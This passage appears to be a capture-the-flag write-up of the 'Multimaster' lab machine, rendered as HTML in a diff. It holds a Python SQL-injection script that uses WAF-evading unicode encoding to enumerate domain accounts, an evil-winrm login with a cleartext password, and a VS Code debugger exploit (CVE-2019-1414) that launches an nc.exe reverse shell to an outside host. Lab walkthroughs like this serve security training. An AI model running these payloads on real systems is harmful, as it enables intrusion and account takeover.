+        <span class="k">return</span> <span class="s">""</span> <span class="p">.</span><span class="n">join</span> <span class="p">(</span><span class="nb">format</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="s">"02x"</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">t</span><span class="p">)</span> <span class="p">.</span><span class="n">upper</span> <span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"[i] Finished, Domain Accounts are over"</span><span class="p">,</span> <span class="s">"blue"</span><span class="p">)</span>
+        <span class="nb">exit</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">1100</span>
+    <span class="n">SID</span> <span class="o">=</span> <span class="s">"0x0105000000000005150000001C00D1BCD181F1492BDFC236"</span>
+    <span class="c1">#SID = raw_input ("Enter SID:")
+</span>    <span class="n">URL</span> <span class="o">=</span> <span class="s">"http://10.10.10.179/api/getColleagues"</span>
+    <span class="c1">#URL = raw_input ("Enter URL:")
+</span>
+    <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"\ n \ t + ------------------------------------------ ---------------------------- + "</span><span class="p">,</span><span class="s">" magenta "</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"\ t | |"</span><span class="p">,</span> <span class="s">"magenta"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"\ t | Enumerating Script For Domain Accounts by M0NET |"</span><span class="p">,</span> <span class="s">"magenta"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"\ t | SID:"</span> <span class="o">+</span> <span class="n">SID</span> <span class="o">+</span> <span class="s">"|"</span><span class="p">,</span> <span class="s">"magenta"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"\ t | |"</span><span class="p">,</span> <span class="s">"magenta"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"\ t + -------------------------------------------- -------------------------- + \ n \ n "</span><span class="p">,</span><span class="s">" magenta "</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1100</span><span class="p">,</span><span class="mi">6100</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">15</span><span class="p">):</span>
+            <span class="n">JUNK</span> <span class="o">=</span> <span class="s">"0"</span> <span class="o">+</span> <span class="nb">hex</span> <span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span> <span class="p">[</span><span class="mi">2</span><span class="p">:].</span> <span class="n">Upper</span> <span class="p">()</span>
+            <span class="n">RID</span> <span class="o">=</span> <span class="n">SID</span> <span class="o">+</span> <span class="n">little</span> <span class="p">(</span><span class="n">JUNK</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="s">"0"</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s">"- 'union select 1,2,3,4, SUSER_SNAME ({}) - -"</span><span class="p">.</span> <span class="nb">format</span> <span class="p">(</span><span class="n">RID</span><span class="p">)</span>
+            <span class="c1">#payload = raw_input ("Enter Payload:")
+</span>            <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span> <span class="p">(</span><span class="n">r</span> <span class="s">"([0-9a-f] {2})"</span><span class="p">)</span>
+            <span class="n">encpyload</span> <span class="o">=</span> <span class="n">pattern</span><span class="p">.</span><span class="n">sub</span> <span class="p">(</span><span class="n">r</span> <span class="s">"</span><span class="se">\\</span><span class="s"> u00 \ 1"</span><span class="p">,</span> <span class="n">payload</span><span class="p">.</span><span class="n">encode</span> <span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span> <span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="s">'{"name": "'</span> <span class="o">+</span> <span class="n">encpyload</span> <span class="o">+</span> <span class="s">'"}'</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application / json; charset = utf-8"</span><span class="p">})</span>
+            <span class="k">if</span> <span class="s">"403 - Forbidden: Access is denied."</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"[-] Sleeping until WAF cooldown"</span><span class="p">,</span> <span class="s">"red"</span><span class="p">)</span>
+                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span> <span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+                <span class="k">continue</span>
+            <span class="k">if</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"[i] Counter:"</span> <span class="o">+</span> <span class="nb">format</span> <span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="n">i</span><span class="p">)),</span> <span class="s">"blue"</span><span class="p">)</span>
+                <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"[+] RID:"</span> <span class="o">+</span> <span class="nb">format</span> <span class="p">(</span><span class="n">RID</span><span class="p">),</span> <span class="s">"green"</span><span class="p">)</span>
+                <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"[+] Pyload:"</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+                <span class="c1">#print colored ("[+] Encoded payload:" + format (encpayload), "green")
+</span>                <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="s">"\ n"</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
+
+            <span class="n">jsona</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">jsona</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="k">for</span> <span class="n">element</span> <span class="ow">in</span> <span class="n">jsona</span><span class="p">:</span>
+                        <span class="k">del</span> <span class="n">element</span> <span class="p">[</span><span class="n">u</span> <span class="s">"position"</span><span class="p">]</span>
+                        <span class="k">del</span> <span class="n">element</span> <span class="p">[</span><span class="n">u</span> <span class="s">"id"</span><span class="p">]</span>
+                        <span class="k">del</span> <span class="n">element</span> <span class="p">[</span><span class="n">u</span> <span class="s">"email"</span><span class="p">]</span>
+                        <span class="k">del</span> <span class="n">element</span> <span class="p">[</span><span class="n">u</span> <span class="s">"name"</span><span class="p">]</span>
+                <span class="k">except</span> <span class="nb">TypeError</span><span class="p">:</span>
+                    <span class="k">del</span> <span class="n">jsona</span> <span class="p">[</span><span class="n">u</span> <span class="s">"position"</span><span class="p">]</span>
+                    <span class="k">del</span> <span class="n">jsona</span> <span class="p">[</span><span class="n">u</span> <span class="s">"id"</span><span class="p">]</span>
+                    <span class="k">del</span> <span class="n">jsona</span> <span class="p">[</span><span class="n">u</span> <span class="s">"email"</span><span class="p">]</span>
+                    <span class="k">del</span> <span class="n">jsona</span> <span class="p">[</span><span class="n">u</span> <span class="s">"name"</span><span class="p">]</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span> <span class="p">(</span><span class="n">jsona</span><span class="p">,</span> <span class="n">sort_keys</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="n">indent</span> <span class="o">=</span> <span class="mi">4</span><span class="p">)</span>
+                <span class="k">if</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                    <span class="k">print</span> <span class="n">colored</span> <span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="s">"\ n"</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
+            <span class="n">i</span> <span class="o">+</span> <span class="o">=</span> <span class="mi">1</span>
+</pre></table></code></div></div><h2 id="initial-foothold">Initial Foothold</h2><h2 id="road-to-user">Road to User</h2><h3 id="further-enumeration">Further enumeration</h3><h3 id="finding-user-creds">Finding user creds</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u tushikikatomo -i 10.10.10.179 -p finance1
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt;
+</pre></table></code></div></div><h3 id="usertxt">User.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; cat user.txt
+6043eb65fb46ebf347fa4c1fe9584a2f
+</pre></table></code></div></div><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-tushikikatomo">Enumeration as User <code class="language-plaintext highlighter-rouge">tushikikatomo</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== =============================================
+megacorp\tushikikatomo S-1-5-21-3167813660-1240564177-918740779-1110
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</pre></table></code></div></div><p>User folders on this box include:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users&gt; ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/7/2020   7:24 PM                .NET v4.5
+d-----         1/7/2020   7:24 PM                .NET v4.5 Classic
+d-----         1/9/2020   3:18 AM                Administrator
+d-----         3/9/2020   3:20 AM                alcibiades
+d-----         3/9/2020   2:53 AM                cyork
+d-----         1/9/2020   5:14 PM                jorden
+d-----         3/7/2020   8:38 AM                MSSQLSERVER
+d-r---       11/20/2016   5:24 PM                Public
+d-----         1/9/2020   5:12 PM                sbauer
+d-----         3/7/2020   8:38 AM                SQLTELEMETRY
+</pre></table></code></div></div><p><a href="https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/">https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/</a></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\&gt; net users /domain
+
+User accounts for \\                                                                                 -------------------------------------------------------------------------------                         
+Administrator            aldom                    alice
+alyx                     andrew                   ckane
+cyork                    dai                      DefaultAccount
+Guest                    ilee                     james
+jorden                   jsmmons                  kpage
+krbtgt                   lana                     nbourne
+okent                    pmartin                  rmartin
+sbauer                   svc-nas                  svc-sql
+tushikikatomo            zac                      zpowers
+The command completed with one or more errors.
+</pre></table></code></div></div><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; net group /domain
+
+Group Accounts for \\
+
+-------------------------------------------------------------------------------
+*Cloneable Domain Controllers
+*Developers
+*DnsUpdateProxy
+*Domain Admins
+*Domain Computers
+*Domain Controllers
+*Domain Guests
+*Domain Users
+*Enterprise Admins
+*Enterprise Key Admins
+*Enterprise Read-only Domain Controllers
+*Group Policy Creator Owners
+*Key Admins
+*Privileged IT Accounts
+*Protected Users
+*Read-only Domain Controllers
+*Schema Admins
+*test
+The command completed with one or more errors.
+</pre></table></code></div></div><p>text</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; net group 'Developers'
+Group name     Developers
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+aldom                    cyork                    jorden
+sbauer
+The command completed successfully.
+</pre></table></code></div></div><p><a href="https://activedirectorypro.com/powershell-commands/">https://activedirectorypro.com/powershell-commands/</a></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; Get-Process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    328      32    39292      64712               180   1 Code
+    628      43    32524      84076               760   1 Code
+    412      53    94712     131244              4568   1 Code
+    414      22    16260      24216              4864   1 Code
+    285      51    57736      74568              5548   1 Code
+    284      51    58528      74368              5616   1 Code
+    211      15     6108      12548              5916   1 Code
+    416      55    95496     135496              6084   1 Code
+    117      10     2940      12652              6092   1 conhost
+    361      13     1916       4280               380   0 csrss
+    235      16     2168       4152               468   1 csrss
+    357      32    14196      24664              2296   0 dfsrs
+    170      13     2384       7740              2548   0 dfssvc
+    209      13     3640      12420              3104   0 dllhost
+    102       7     1272       5744              4624   0 dllhost
+  10317    7406   129808     127984              2272   0 dns
+    328      21    27084      57052                76   1 dwm
+   1186      50    18764      69524              4148   1 explorer
+      0       0        0          4                 0   0 Idle
+    119      12     1732       5420              2316   0 ismserv
+   1903     235    52220      66620               592   0 lsass
+    602      30    36908      46132              2244   0 Microsoft.ActiveDirectory.WebServices
+    157      10     2636       8652              5736   0 MpCmdRun
+    190      13     2748       9848              3372   0 msdtc
+    568      67   145132     123708              2496   0 MsMpEng
+    171      39     3952      11240              3820   0 NisSrv
+    346      11     4920      10780               584   0 services
+    255      14     2968      16884              4900   1 sihost
+     51       2      392       1216               296   0 smss
+    441      25     6284      18092              2204   0 spoolsv
+    978      29    47416      55204              3280   0 sqlceip
+    670     100   369680     261356              3288   0 sqlservr
+    106       9     1712       7616              2352   0 sqlwriter
+    496      30    11704      22556               344   0 svchost
+    639      45     8884      22468               580   0 svchost
+    564      20     5632      18732               764   0 svchost
+    428      34    10276      18628               780   0 svchost
+    588      18     4264       9896               816   0 svchost
+   1592      53    26188      51036               960   0 svchost
+    506      20     4484      12960               968   0 svchost
+    501      18    12688      19136               992   0 svchost
+    869      31     9004      21868              1000   0 svchost
+    157      11     1696       6884              1344   0 svchost
+    137      12     1788       6912              1436   0 svchost
+    239      18     2656       9252              1460   0 svchost
+    140      11     3768      10516              2256   0 svchost
+    363      20     7556      21320              2264   0 svchost
+    187      16     4116      15060              2400   0 svchost
+    197      14     4796      11724              2436   0 svchost
+    284      18     4368      19148              4912   1 svchost
+    978       0      124        144                 4   0 System
+    233      16     3060      13748              4940   1 taskhostw
+    197      16     2620      11192              3120   0 vds
+    146      11     3060       9996              2452   0 VGAuthService
+    352      21    10084      23688              2444   0 vmtoolsd
+    206      17     3692      14316              5228   1 vmtoolsd
+     92       8      956       4848               460   0 wininit
+    202      10     2112      10272               536   1 winlogon
+    336      17    10316      20344              3032   0 WmiPrvSE
+    637      27    58080      75892       1.23   3068   0 wsmprovhost
+    258      11     1836       7888              1364   0 WUDFHost
+</pre></table></code></div></div><p>text</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\resources\app&gt; more package.json
+{
+  "name": "Code",
+  "version": "1.37.1",
+</pre></table></code></div></div><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1414">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1414</a></p><blockquote><p>An elevation of privilege vulnerability exists in Visual Studio Code when it exposes a debug listener to users of a local computer. A local attacker who successfully exploited the vulnerability could inject arbitrary code to run in the context of the current user. If the current user is logged on with administrative user rights, an attacker could take control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. To exploit this vulnerability, a local attacker would need to determine which port Visual Studio Code is listening on for a targeted user.</p></blockquote><h3 id="moving-to-user2">Moving to user2</h3><p>each site leads to next : <a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414</a> <a href="https://github.com/qazbnm456/awesome-cve-poc">https://github.com/qazbnm456/awesome-cve-poc</a> <a href="https://github.com/nu11secur1ty/Exp101tsArchiv30thers">https://github.com/nu11secur1ty/Exp101tsArchiv30thers</a> <a href="https://iwantmore.pizza/posts/cve-2019-1414.html">https://iwantmore.pizza/posts/cve-2019-1414.html</a></p><blockquote><p>Exploitation There are two main limitations to the exploitability, that are: 1. the debug port binds to 127.0.0.1 2. a random TCP port is used every execution</p><p>Due to these limitations, the issue cannot be remotely exploited. If instead a fixed TCP port was used, the issue could have been exploited via the browser using a DNS Rebinding attack to bypass the Same Origin Policy. To be able to execute arbitary JavaScript code, we need first to retrieve the WebSocket link using a HTTP GET request to /json URL and then connect to it using the WebSocket protocol.</p></blockquote><p><a href="https://github.com/phra/inspector-exploiter">https://github.com/phra/inspector-exploiter</a></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&gt; more code.cmd
+@echo off
+setlocal
+set VSCODE_DEV=
+set ELECTRON_RUN_AS_NODE=1
+"%~dp0..\Code.exe" "%~dp0..\resources\app\out\cli.js" %*
+endlocal
+</pre></table></code></div></div><p>text</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&gt; more ../\resources\app\out\cli.js
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+"use strict";const bootstrap=require("./bootstrap");bootstrap.avoidMonkeyPatchFromAppInsights(),bootstrap.configurePortable(),bootstrap.enableASARSupport(),require("./bootstrap-amd").load("vs/code/node/cli");
+//# sourceMappingURL=https://ticino.blob.core.windows.net/sourcemaps/f06011ac164ae4dc8e753a3fe7f9549844d15e35/core/cli.js.map
+</pre></table></code></div></div><p>text</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&gt; ./code --inspect
+code.cmd : Debugger listening on ws://127.0.0.1:9229/a377826b-0406-4fce-8a79-41ac482f80fb
+    + CategoryInfo          : NotSpecified: (Debugger listen...79-41ac482f80fb:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+For help, see: https://nodejs.org/en/docs/inspector
+</pre></table></code></div></div><p>text</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\alcibiades&gt; ./c.exe
+c.exe : [2020/07/24 07:42:30:1971] U: There are 3 tcp sockets in state listen.
+    + CategoryInfo          : NotSpecified: ([2020/07/24 07:...n state listen.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2020/07/24 07:42:50:2430] U: There were 1 servers that appear to be CEF debuggers.
+[2020/07/24 07:42:50:2430] U: ws://127.0.0.1:7437/68e9868e-29b8-48fc-9612-8be4aea95ccd
+</pre></table></code></div></div><p>had to keep starting over again as the CEF debug server kept changing</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\alcibiades&gt; C:\Users\alcibiades\c.exe --url ws://127.0.0.1:7437/68e9868e-29b8-48fc-9612-8be4aea95ccd --code "process.mainModule.require('child_process').exec('cmd.exe /c C:\Users\alcibiades\nc.exe 10.10.15.57 4445 -e cmd.exe')"
+c.exe : [2020/07/24 07:44:55:7426] U: &gt;&gt;&gt; process.mainModule.require('child_process').exec('cmd.exe /c C:\Users\alcibiades\nc.exe 10.10.15.57 4445 -e cmd.exe')
+    + CategoryInfo          : NotSpecified: ([2020/07/24 07:...45 -e cmd.exe'):String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2020/07/24 07:44:55:7426] U: &lt;&lt;&lt; ChildProcess
+</pre></table></code></div></div><h3 id="moving-laterally-to-user---cyork">Moving laterally to user - <code class="language-plaintext highlighter-rouge">cyork</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\cyork\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== =============================================
+megacorp\cyork S-1-5-21-3167813660-1240564177-918740779-3110
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+MEGACORP\Developers                        Group            S-1-5-21-3167813660-1240564177-918740779-3119 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</pre></table></code></div></div><p>while searching around I cound that I had access to a folder I didn’t before…the <code class="language-plaintext highlighter-rouge">wwwroot\</code> folder in <code class="language-plaintext highlighter-rouge">C:\inetpub\</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\inetpub\wwwroot&gt; more index.html
+&lt;!DOCTYPE html&gt;&lt;html lang=en&gt;&lt;head&gt;&lt;meta charset=utf-8&gt;&lt;meta http-equiv=X-UA-Compatible content="IE=edge"&gt;&lt;meta name=viewport content="width=device-width,initial-scale=1"&gt;&lt;link rel=icon href=/favicon.ico&gt;&lt;title&gt;MegaCorp&lt;/title&gt;&lt;link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900"&gt;&lt;link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@mdi/font@latest/css/materialdesignicons.min.css&gt;&lt;link href=/js/about.893bb588.js rel=prefetch&gt;&lt;link href=/css/app.90380d45.css rel=preload as=style&gt;&lt;link href=/css/chunk-vendors.11727d04.css rel=preload as=style&gt;&lt;link href=/js/app.eeb965b5.js rel=preload as=script&gt;&lt;link href=/js/chunk-vendors.ae41a8ca.js rel=preload as=script&gt;&lt;link href=/css/chunk-vendors.11727d04.css rel=stylesheet&gt;&lt;link href=/css/app.90380d45.css rel=stylesheet&gt;&lt;/head&gt;&lt;body&gt;&lt;noscript&gt;&lt;strong&gt;We're sorry but multimaster doesn't work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt;&lt;/noscript&gt;&lt;div id=app&gt;&lt;/div&gt;&lt;script src=/js/chunk-vendors.ae41a8ca.js&gt;&lt;/script&gt;&lt;script src=/js/app.eeb965b5.js&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
